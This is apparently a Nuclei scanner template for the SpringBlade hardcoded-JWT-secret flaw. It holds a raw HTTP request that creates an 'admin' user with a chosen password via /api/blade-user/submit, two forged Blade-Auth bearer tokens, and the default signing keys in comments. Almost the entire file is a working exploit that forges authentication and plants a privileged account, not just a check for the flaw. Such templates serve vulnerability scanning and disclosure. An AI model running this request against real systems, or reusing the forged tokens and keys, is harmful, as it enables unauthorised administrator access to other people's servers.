id: SpringBlade-create-user

info:
  name: SpringBlade jwt默认密钥硬编码漏洞
  author: sec
  severity: high
  description: https://forum.butian.net/share/973
  tags: jwt

http:
  - raw:   
      - |
        POST /api/blade-user/submit HTTP/1.1
        Host: {{Hostname}}
        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.77 Safari/537.36
        {{jwt}}
        Connection: close
        Content-Type: application/json

        {
          "account": "admin",
          "name": "admin",
          "password": "adminGG",
          "tenantId": "000000",
          "roleId": "1123598816738675201",
          "deptId": "1123598816738675201",
          "postId": "1123598816738675201"
        }
    payloads:
      jwt:
        # 默认密钥：bladexisapowerfulmicroservicearchitectureupgradedandoptimizedfromacommercialproject
        - "Blade-Auth: bearer eyJhbGciOiJIUzI1NiIsInR5cCI6IkpXVCJ9..RtS67Tmbo7yFKHyMz_bMQW7dfgNjxZW47KtnFcwItxQ"
        # 默认密钥：BladeX
        - "Blade-Auth: bearer eyJ0eXAiOiJKc29uV2ViVG9rZW4iLCJhbGciOiJIUzI1NiJ9..tUgcE7QGzhe1nm_lT6aoMpZSdXKKNJyMBTMybd5RkWQ"
    
    attack: batteringram
    threads: 5
    stop-at-first-match: true

    matchers:
      - type: dsl
        dsl:
          - 'contains(body, "\"success\":")'
          - 'status_code == 400'
          - 'contains(header, "application/json")'
        condition: and
